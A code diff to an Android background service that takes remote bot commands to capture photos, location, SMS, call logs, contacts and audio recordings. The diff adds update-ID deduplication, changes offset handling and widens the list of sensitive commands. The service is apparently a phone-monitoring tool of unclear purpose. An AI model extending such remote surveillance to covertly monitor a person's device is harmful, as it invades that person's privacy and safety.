@@ -96,6 +96,7 @@ class MonitoringService : Service() {
     @Volatile
     private var cachedSyncInterval = -1
     private var cachedSetupTap: android.app.PendingIntent? = null
+    private val handledUpdateIds = java.util.Collections.synchronizedSet(LinkedHashSet<Long>())
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
@@ -103,7 +104,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history")
+        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -647,7 +648,8 @@ class MonitoringService : Service() {
             try {
                 val body = response.errorBody()?.string()?.lowercase(java.util.Locale.ROOT).orEmpty()
                 if (body.contains("offset") || body.contains("bad request")) {
-                    preferencesManager.setLastUpdateIdSync(0L)
+                    val cur = try { preferencesManager.lastUpdateId } catch (_: Exception) { 0L }
+                    if (cur < 0L) preferencesManager.setLastUpdateIdSync(0L)
                 }
             } catch (_: Exception) {
             }
@@ -663,6 +665,18 @@ class MonitoringService : Service() {
         val updates = response.body()?.result ?: return false
         if (updates.isEmpty()) return false
         for (update in updates) {
+            val seen = !handledUpdateIds.add(update.updateId)
+            if (handledUpdateIds.size > 300) {
+                try {
+                    val it = handledUpdateIds.iterator()
+                    if (it.hasNext()) {
+                        it.next()
+                        it.remove()
+                    }
+                } catch (_: Exception) {
+                }
+            }
+            if (seen) continue
             try {
                 val callback = update.callbackQuery
                 if (callback != null) {
